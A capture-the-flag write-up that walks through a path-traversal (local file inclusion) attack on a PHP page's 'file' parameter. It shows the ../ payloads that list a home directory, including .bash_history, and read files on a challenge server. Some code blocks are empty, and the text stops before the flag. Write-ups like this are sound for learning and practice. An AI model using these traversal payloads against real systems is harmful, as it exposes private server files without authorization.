__PROBLEM__

I don't wanna go anywhere.

__SOLUTION__

This is also related to `Jade gates` problem. In the last step of jade gates we found some strings

```bash

Here we see there's something about `crystalgate`. So we visit `http://18.191.227.167/crystalsfordays/index.html` and get redirected to
`http://18.191.227.167/crystalsfordays/traversethebridge.php` and gets some text
```
Note: Only used for access management and to check user info.
Note2: I can't seem to remember the param. It's "file"
```

Notice the emphasis on `file` we try something like `http://18.191.227.167/crystalsfordays/traversethebridge.php/?file=../../../../../../../../../../../flag
`
what are we doing here? well we use a parameter called `file` and then we are trying to do LFI a.k.a Local file inclusion to get the files present in the server but we fail as we get

```
Note: Only used for access management and to check user info.
Note2: I can't seem to remember the param. It's "file"
That action is forbidden.
```

Again thanks to @grtven on discord for pointing out that we have to traverse the directory one by one.
So we start with `http://18.191.227.167/crystalsfordays/traversethebridge.php/?file=../` and then `http://18.191.227.167/crystalsfordays/traversethebridge.php/?file=../../
` and see

```
Note: Only used for access management and to check user info.
Note2: I can't seem to remember the param. It's "file"
.. .bash_history webserver . .bash_logout .bashrc .bash_profile TheEgg.html
```

There is a `TheEgg.html` that seems a bit different from others so we visit that `http://18.191.227.167/crystalsfordays/traversethebridge.php/?file=../../TheEgg.html
` and get

```

THE END
